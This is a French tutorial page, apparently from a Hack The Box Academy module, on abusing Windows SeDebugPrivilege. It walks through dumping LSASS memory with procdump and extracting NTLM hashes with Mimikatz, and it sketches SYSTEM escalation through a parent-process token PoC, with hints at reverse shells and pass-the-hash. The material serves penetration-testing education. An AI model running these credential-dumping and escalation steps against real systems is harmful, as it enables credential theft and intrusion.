SeDebugPrivilege
================

* * * * *

Pour exécuter une application ou un service particulier ou aider au dépannage, un utilisateur peut se voir attribuer le [SeDebugPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/ debug-programs) au lieu d'ajouter le compte au groupe d'administrateurs. Ce privilège peut être attribué via une stratégie de groupe locale ou de domaine, sous `Paramètres de l'ordinateur > Paramètres Windows > Paramètres de sécurité`. Par défaut, seuls les administrateurs disposent de ce privilège car il peut être utilisé pour capturer des informations sensibles de la mémoire système ou accéder/modifier les structures du noyau et des applications. Ce droit peut être attribué aux développeurs qui ont besoin de déboguer de nouveaux composants système dans le cadre de leur travail quotidien. Ce droit d'utilisateur doit être accordé avec parcimonie, car tout compte qui lui est attribué aura accès aux composants critiques du système d'exploitation.

Lors d'un test d'intrusion interne, il est souvent utile d'utiliser des sites Web tels que LinkedIn pour recueillir des informations sur les utilisateurs potentiels à cibler. Supposons, par exemple, que nous récupérions de nombreux hachages de mots de passe NTLMv2 à l'aide de `Responder` ou `Inveigh`. Dans ce cas, nous pouvons concentrer nos efforts de piratage de mot de passe sur d'éventuels comptes de grande valeur, tels que les développeurs qui sont plus susceptibles d'avoir ces types de privilèges attribués à leurs comptes. Un utilisateur peut ne pas être un administrateur local sur un hôte mais avoir des droits que nous ne pouvons pas énumérer à distance à l'aide d'un outil tel que BloodHound. Cela vaudrait la peine de vérifier dans un environnement où nous obtenons des informations d'identification pour plusieurs utilisateurs et avons un accès RDP à un ou plusieurs hôtes, mais sans privilèges supplémentaires.

![image](https://academy.hackthebox.com/storage/modules/67/debug.png)

Après s'être connecté en tant qu'utilisateur disposant du droit `Déboguer les programmes` et avoir ouvert un shell élevé, nous constatons que `SeDebugPrivilege` est répertorié.

```
C:\htb> whoami /priv

INFORMATIONS SUR LES PRIVILÈGES
----------------------

Nom du privilège Description État
======================================== ========= ================================================= ======= ========
Programmes de débogage SeDebugPrivilege désactivés
SeChangeNotifyPrivilege Bypass traverse la vérification activée
SeIncreaseWorkingSetPrivilege Augmenter un ensemble de travail de processus Désactivé

```

Nous pouvons utiliser [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads /sysinternals-suite) suite pour tirer parti de ce privilège et vider la mémoire du processus. Un bon candidat est le processus du service de sous-système de l'autorité de sécurité locale ([LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)), qui stocke les informations d'identification de l'utilisateur après qu'un utilisateur se connecte à un système.

```
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Utilitaire de vidage de processus Sysinternals
Copyright (C) 2009-2020 Mark Russinovich et Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Vidage 1 lancé : C:\Tools\Procdump\lsass.dmp
[15:25:45] Écriture du vidage 1 : la taille estimée du fichier de vidage est de 42 Mo.
[15:25:45] Vidage 1 terminé : 43 Mo écrits en 0,5 seconde
[15:25:46] Nombre de vidages atteint.

```

C'est réussi, et nous pouvons le charger dans `Mimikatz` à l'aide de la commande `sekurlsa::minidump` . Après avoir émis les commandes `sekurlsa::logonPasswords` , nous obtenons le hachage NTLM du compte administrateur local connecté localement. Nous pouvons l'utiliser pour effectuer une attaque pass-the-hash pour nous déplacer latéralement si le même mot de passe d'administrateur local est utilisé sur un ou plusieurs systèmes supplémentaires (courant dans les grandes organisations).

Remarque : C'est toujours une bonne idée de taper "log" avant d'exécuter des commandes dans "Mimikatz". Ainsi, toutes les sorties de commande placeront la sortie dans un fichier ".txt". Ceci est particulièrement utile lors du vidage des informations d'identification d'un serveur qui peut avoir de nombreux ensembles d'informations d'identification en mémoire.

```
C:\htb> mimikatz.exe

   .#####. mimikatz 2.2.0 (x64) #19041 18 sept. 2020 19:18:29
  .## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
  ## / \ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
  ## \ / ## > https://blog.gentilkiwi.com/mimikatz
  '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
   '#####' > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Utilisation de 'mimikatz.log' pour le fichier journal : OK

mimikatz # sekurlsa::minidump lsass.dmp
Basculer vers MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Ouverture : fichier 'lsass.dmp' pour minidump...

Identifiant d'authentification : 0 ; 23196355 (00000000:0161f2c3)
Session : Interactif à partir de 4
Nom d'utilisateur : DWM-4
Domaine : Gestionnaire de fenêtres
Serveur de connexion : (null)
Heure de connexion : 31/03/2021 15:00:57
SID : S-1-5-90-0-4
         msv :
         tspkg :
         wdigest :
          * Nom d'utilisateur : WINLPE-SRV01$
          * Domaine : GROUPE DE TRAVAIL
          * Mot de passe : (null)
         kerberos :
         ssp :
         credman :

<SNIP>

Identifiant d'authentification : 0 ; 23026942 (00000000:015f5cfe)
Session : RemoteInteractive à partir de 2
Nom d'utilisateur : Jordan
Domaine : WINLPE-SRV01
Serveur de connexion : WINLPE-SRV01
Heure de connexion : 31/03/2021 14:59:52
SID : S-1-5-21-3769161915-3336846931-3985975925-1000
         msv :
          [00000003] Primaire
          * Nom d'utilisateur : jordan
          * Domaine : WINLPE-SRV01
          * NTLM : cf3a5525ee9414229e66279623ed5c58
          * SHA1 : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         tspkg :
         wdigest :
          * Nom d'utilisateur : jordan
          * Domaine : WINLPE-SRV01
          * Mot de passe : (null)
         kerberos :
          * Nom d'utilisateur : jordan
          * Domaine : WINLPE-SRV01
          * Mot de passe : (null)
         ssp :
         credman :

<SNIP>

```

Supposons que nous ne soyons pas en mesure de charger des outils sur la cible pour une raison quelconque, mais que nous disposions d'un accès RDP. Dans ce cas, nous pouvons effectuer un vidage manuel de la mémoire du processus `LSASS` via le gestionnaire de tâches en accédant à l'onglet `Détails` , en choisissant le processus `LSASS` et en sélectionnant `Créer un fichier de vidage`. Après avoir téléchargé ce fichier dans notre système d'attaque, nous pouvons le traiter en utilisant Mimikatz de la même manière que dans l'exemple précédent.

![image](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)

* * * * *

Exécution de code à distance en tant que SYSTEM
-------------------------------

Nous pouvons également tirer parti `SeDebugPrivilege` pour [RCE](https://decoder.cloud/2018/02/02/getting-system/). Grâce à cette technique, nous pouvons élever nos privilèges à SYSTEM en lançant un [processus enfant](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) et en utilisant les droits élevés accordés à notre compte via `SeDebugPrivilege` pour modifier le comportement normal du système afin d'hériter du jeton d'un [processus parent](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) et usurper l'identité il. Si nous ciblons un processus parent s'exécutant en tant que SYSTEM (en spécifiant l'ID de processus (ou PID) du processus cible ou du programme en cours d'exécution), nous pouvons élever rapidement nos droits. Voyons cela en action.

Tout d'abord, transférez ce [script PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) vers le système cible. Ensuite, nous chargeons simplement le script et l'exécutons avec la syntaxe suivante `[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")`. Notez que nous devons ajouter un troisième argument vide `""` à la fin pour que le PoC fonctionne correctement.

Commencez par ouvrir une console PowerShell élevée (cliquez avec le bouton droit de la souris, exécutez en tant qu'administrateur et saisissez les informations d'identification de l'utilisateur `jordan` ). Ensuite, saisissez `tasklist` pour obtenir une liste des processus en cours d'exécution et des PID associés.

```
PS C:\htb> liste des tâches

Nom de l'image PID Nom de la session N° de session Utilisation de la mémoire
========================= ======== ================ = ========== ============
Processus d'inactivité du système 0 Services 0 4 K
Système 4 Services 0 116 000
smss.exe 340 Services 0 1 212 K
csrss.exe 444 Services 0 4 696 K
wininit.exe 548 Services 0 5 240 K
csrss.exe 556 Console 1 5 972 Ko
winlogon.exe 612 Console 1 10 408 Ko

```

Ici, nous pouvons cibler `winlogon.exe` s'exécutant sous le PID 612, qui, nous le savons, s'exécute en tant que SYSTEM sur les hôtes Windows.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_winlogon.png)

Nous pourrions également utiliser l'applet de commande [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) pour saisir le PID d'un processus bien connu qui s'exécute en tant que SYSTEM (tel que LSASS) et transmet le PID directement au script, réduisant ainsi le nombre d'étapes requises.

![image](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)

D'autres outils tels que [celui-ci](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) existent pour faire apparaître un shell SYSTEM lorsque nous avons `SeDebugPrivilege`. Souvent, nous n'aurons pas d'accès RDP à un hôte, nous devrons donc modifier nos PoC pour renvoyer un shell inversé à notre hôte d'attaque en tant que SYSTEM ou une autre commande, comme l'ajout d'un utilisateur administrateur. Jouez avec ces PoC et découvrez les autres moyens d'accéder au SYSTÈME, en particulier si vous ne disposez pas d'une session entièrement interactive, par exemple lorsque vous réalisez une injection de commande ou que vous disposez d'une connexion Web Shell ou d'une connexion Shell inversée en tant qu'utilisateur avec `SeDebugPrivilege`. . Gardez ces exemples à l'esprit au cas où vous vous retrouveriez dans une situation où le vidage de LSASS n'entraîne aucune information d'identification utile (bien que nous puissions obtenir un accès SYSTEM avec uniquement le hachage NTLM de la machine, mais cela est en dehors de la portée de ce module) et un shell ou RCE comme SYSTEM serait bénéfique.